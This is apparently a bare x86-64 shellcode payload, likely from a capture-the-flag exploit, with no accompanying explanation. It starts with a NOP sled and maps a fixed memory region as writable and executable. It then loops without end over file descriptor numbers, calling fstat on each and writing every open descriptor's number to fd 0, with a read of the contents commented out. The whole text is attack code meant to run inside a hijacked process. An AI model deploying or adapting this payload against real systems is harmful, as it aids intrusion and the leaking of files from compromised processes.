
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

mov rdi, 0x414100000000
mov rsi, 0x1000
mov rdx, 6
mov r10, 0x32
mov r8, -1
mov r9, 0
mov rax, 9
syscall

mov r15, 0
mov r14, 0x414100000000

start:

; fdstat
mov rdi, r15
mov rsi, r14
mov rax, 5
syscall

cmp rax, 0
jne next

mov [rsi], r15

; read
;mov rdi, r15
;mov rsi, r14
;mov rdx, 0x1000
;mov rax, 0
;syscall

mov rdi, 0
mov rsi, r14
mov rdx, 0x8
mov rax, 1
syscall

next:
inc r15

jmp start

